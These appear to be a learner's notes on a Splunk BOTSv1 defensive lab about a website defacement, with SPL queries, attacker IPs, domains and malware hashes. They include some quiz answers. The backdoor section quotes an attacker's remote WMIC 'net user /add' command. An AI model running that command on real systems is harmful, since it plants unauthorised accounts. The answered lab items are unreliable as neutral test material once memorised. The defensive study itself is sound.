Fortigate Firewall 'fortigate_utm' detected SQL attempt from the attacker's IP 40.80.148.42. What is the name of the rule that was triggered during the SQL Injection attempt?

## Command and Control

![Command and Control](assets/splunk-bots-162.png)

The attacker uploaded the file to the server before defacing it. While doing so, the attacker used a Dynamic DNS to resolve a malicious IP. Our objective would be to find the IP that the attacker decided the DNS.

To investigate the communication to and from the adversary's IP addresses, we will be examining the network-centric log sources mentioned above. We will first pick fortigate_utm to review the firewall logs and then move on to the other log sources.

- **Search Query:**
```spl
index=botsv1 sourcetype=fortigate_utm"poisonivy-is-coming-for-you-batman.jpeg"
```

![Command and Control](assets/splunk-bots-163.png)

Looking into the Fortinet firewall logs, we can see the src IP, destination IP, and URL. Look at the fields on the left panel and the field url contains the FQDN (Fully Qualified Domain Name).

![Command and Control](assets/splunk-bots-164.png)

Though we have found the answer, we can verify other log sources.

Let us verify the answer by looking at another log source.stream:http.

- **Search Query:**
```spl
index=botsv1 sourcetype=stream:http dest_ip=23.22.63.114 "poisonivy-is-coming-for-you-batman.jpeg" src_ip=192.168.250.70
```

![Command and Control](assets/splunk-bots-165.png)

We have identified the suspicious domain as a Command and Control Server, which the attacker contacted after gaining control of the server.

> **Note:** We can also confirm the domain by looking at the last log source stream:dns to see what DNS queries were sent from the webserver during the infection period.

Answer the questions below

This attack used dynamic DNS to resolve to the malicious IP. What fully qualified domain name (FQDN) is associated with this attack?

## Weaponization

![Weaponization](assets/splunk-bots-166.png)

In the weaponization phase, the adversaries would:

Create Malware / Malicious document to gain initial access / evade detection etc.

Establish domains similar to the target domain to trick users.

Create a Command and Control Server for the post-exploitation communication/activity etc.

We have found some domains / IP addresses associated with the attacker during the investigations. This task will mainly look into OSINT sites to see what more information we can get about the adversary.

So far, we have found a domain prankglassinebracket.jumpingcrab.com associated with this attack. Our first task would be to find the IP address tied to the domains that may potentially be pre-staged to attack Wayne Enterprise.

In the following exercise, we will be searching the online Threat Intel sites for any information like IP addresses/domains / Email addresses associated with this domain which could help us know more about this adversary.

### Robtex

Robtex is a Threat Intel site that provides information about IP addresses, domain names, etc.

Please search for the domain on the robtex site and see what we get. We will get the IP addresses associated with this domain.

![Robtex](assets/splunk-bots-167.png)

Some domains/subdomains associated with this domain:

![Robtex](assets/splunk-bots-168.png)

- **Reference: https://www.robtex.com/dns-lookup/prankglassinebracket.jumpingcrab.com**

Next, search for the IP address 23.22.63.114 on this Threat Intel site.

![Robtex](assets/splunk-bots-169.png)

What did we find? this IP is associated with some domains that look pretty similar to the WAYNE Enterprise site.

- **Reference: https://www.robtex.com/ip-lookup/23.22.63.114**

![Robtex](assets/splunk-bots-170.png)

### Virustotal

Virustotal is an OSINT site used to analyze suspicious files, domains, IP, etc. Let's now search for the IP address on the virustotal site. If we go to the RELATIONS tab, we can see all the domains associated with this IP which look similar to the Wayn Enterprise company.

![Virustotal](assets/splunk-bots-171.png)

In the domain list, we saw the domain that is associated with the attacker www.po1s0n1vy.com . Let us search for this domain on the virustotal.

![Virustotal](assets/splunk-bots-172.png)

We can also look for the whois information on this site -> whois.domaintools.com to see if we can find something valuable.

![Virustotal](assets/splunk-bots-173.png)

Answer the questions below

#### What IP address has P01s0n1vy tied to domains that are pre-staged to attack Wayne Enterprises?

#### Based on the data gathered from this attack and common open-source intelligence sources for domain names, what is the email address that is most likely associated with the P01s0n1vy APT group?

## Delivery

![Delivery](assets/splunk-bots-174.png)

Attackers create malware and infect devices to gain initial access or evade defenses and find ways to deliver it through different means. We have identified various IP addresses, domains and Email addresses associated with this adversary. Our task for this lesson would be to use the information we have about the adversary and use various Threat Hunting platforms and OSINT sites to find any malware linked with the adversary.

Threat Intel report suggested that this adversary group Poison lvy appears to have a secondary attack vector in case the initial compromise fails. Our objective would be to understand more about the attacker and their methodology and correlate the information found in the logs with various threat Intel sources.

### OSINT sites

### Virustotal

### ThreatMiner

### Hybrid-Analysis

### ThreatMiner

Let's start our investigation by looking for the IP 23.22.63.114 on the Threat Intel site ThreatMiner.

![ThreatMiner](assets/splunk-bots-175.png)

We found three files associated with this IP, from which one file with the hash value c99131e0169171935c5ac32615ed6261 seems to be malicious and something of interest.

Now, click on this MD5 hash value to see the metadata and other important information about this particular file.

![ThreatMiner](assets/splunk-bots-176.png)

- **Reference: https://www.threatminer.org/host.php?q=23.22.63.114#gsc.tab=0&gsc.q=23.22.63.114&gsc.page=1**

### Virustotal

Open virustotal.com and search for the hash on the virustotal now. Here, we can get information about the metadata about this Malware in the Details tab.

![Virustotal](assets/splunk-bots-177.png)

![Virustotal](assets/splunk-bots-178.png)

- **Reference: https://www.virustotal.com/gui/file/9709473ab351387aab9e816eff3910b9f28a7a70202e250ed46dba8f820f34a8/community**

### Hybrid-Analysis

Hybrid Analysis is a beneficial site that shows the behavior Analysis of any malware. Here you can look at all the activities performed by this Malware after being executed. Some of the information that Hybrid-Analysis provides are:

Network Communication.

DNS Requests

Contacted Hosts with Country Mapping

Strings

MITRE ATT&CK Mapping

Malicious Indicators.

DLLs Imports / Exports

Mutex Information if created

File Metadata

Screenshots

![Hybrid-Analysis](assets/splunk-bots-179.png)

Scroll down, and you will get a lot of information about this Malware.

![Hybrid-Analysis](assets/splunk-bots-180.png)

- **Reference: https://www.hybrid-analysis.com/sample/9709473ab351387aab9e816eff3910b9f28a7a70202e250ed46dba8f820f34a8?environmentId=100**

## Conclusion

In this fun exercise, as a SOC Analyst, we have investigated a cyber-attack where the attacker had defaced a website 'imreallynotbatman.com' of the Wayne Enterprise. We mapped the attacker's activities into the 7 phases of the Cyber Kill Chain. Let us recap everything we have found so far:

Reconnaissance Phase:

We first looked at any reconnaissance activity from the attacker to identify the IP address and other details about the adversary.

#### Findings

IP Address 40.80.148.42 was found to be scanning our webserver.

The attacker was using Acunetix as a web scanner.

Exploitation Phase:

We then looked into the traces of exploitation attempts and found brute-force attacks against our server, which were successful.

#### Findings

Brute force attack originated from IP 23.22.63.114.

The IP address used to gain access: 40.80.148.42

142 unique brute force attempts were made against the server, out of which one attempt was successful

Installation Phase:

Next, we looked at the installation phase to see any executable from the attacker's IP Address uploaded to our server.

#### Findings

A malicious executable file 3791.exe was observed to be uploaded by the attacker.

We looked at the sysmon logs and found the MD5 hash of the file.

Action on Objective:

After compromising the web server, the attacker defaced the website.

#### Findings

We examined the logs and found the file name used to deface the webserver.

Weaponization Phase:

We used various threat Intel platforms to find the attacker's infrastructure based on the following information we saw in the above activities.

Information we had:

Domain: prankglassinebracket.jumpingcrab.com

IP Address: 23.22.63.114

#### Findings

Multiple masquerading domains were found associated with the attacker's IPs.

An email of the user Lillian.rose@po1s0n1vy.com was also found associated with the attacker's IP address.

Deliver Phase:

In this phase, we again leveraged online Threat Intel sites to find malware associated with the adversary's IP address, which appeared to be a secondary attack vector if the initial compromise failed.

#### Findings

A malware name MirandaTateScreensaver.scr.exe was found associated with the adversary.

MD5 of the malware was c99131e0169171935c5ac32615ed6261

## Investigating with Splunk

#### How many events were collected and ingested in the index main?

```spl
index=main
```

#### On one of the infected hosts, the adversary was successful in creating a backdoor user. What is the new username?

```spl
Index=main EventID=4720
```

On the same host, a registry key was also updated regarding the new backdoor user. What is the full path of that registry key?

- The domain is "cybertees", still need the same user, and it's a registry event.
```spl
index=main cybertees a1berto registry
```

Examine the logs and identify the user that the adversary was trying to impersonate.

- Guessed
- The existence of A1berto indicated the existence of Alberto
```spl
index=main Alberto
```

- tried Alberto as the answer

#### What is the command used to add a backdoor user from a remote computer?

```spl
index=main powershell SourceName="Microsoft-Windows-Security-Auditing"
```

- **Answer:** "C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add A1berto paw0rd1"

#### How many times was the login attempt from the backdoor user observed during the investigation?

```spl
index=main EventID=3 Hostname="James.browne" A1berto
```

- Answer was actually zero

#### What is the name of the infected host on which suspicious Powershell commands were executed?

```spl
index=main powershell
```

- only one host was presented

PowerShell logging is enabled on this device. How many events were logged for the malicious PowerShell execution?

```spl
index=main EventID=4103
```

#### An encoded Powershell script from the infected host initiated a web request. What is the full URL?

## Additional Extracted Notes

The following short notes appeared outside the main content area of the DOCX and are preserved here to avoid losing source material.

```text
\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153
acunetixshellshock
```
